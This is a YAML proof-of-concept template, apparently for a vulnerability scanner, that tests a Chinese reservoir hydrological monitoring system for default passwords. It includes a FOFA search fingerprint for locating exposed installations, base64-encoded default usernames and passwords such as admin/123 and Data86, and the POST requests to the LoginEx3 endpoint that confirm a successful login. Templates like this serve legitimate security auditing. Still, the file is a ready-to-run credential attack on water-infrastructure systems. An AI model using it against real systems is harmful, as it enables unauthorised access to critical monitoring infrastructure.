id: poc-yaml-data86-monitoring-system-weak-password
info:
  name: 平升水库水文监测系统默认密码
  severity: high
  tags:
  - 弱口令
  finger: 平升水库水文监测系统
  fofa: body="js/PSExtend.js"
variables:
  name: 'base64("admin")

    base64("Data86")

    '
  passwd: 'base64("admin")

    base64("123")

    base64("Data86")

    '
firstRequest:
  method: POST
  path: /WebServices/UserAdminService.asmx/LoginEx3
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: LoginName=aW50ZXJmYWNl&LoginPwd=aW50ZXJmYWNl&isRemember=false
  expression: "status_code == 200 && \ncontains(body,\"此用户不存在\") &&\ncontains(body,`\"\
    Result\":false`)\n"
requests:
- method: POST
  path: /WebServices/UserAdminService.asmx/LoginEx3
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: LoginName={{.name}}&LoginPwd={{.passwd}}&isRemember=false
  expression: "status_code == 200 && \ncontains(body,\"登陆成功\") &&\ncontains(body,`\"\
    Result\":true`)\n"
transport: http
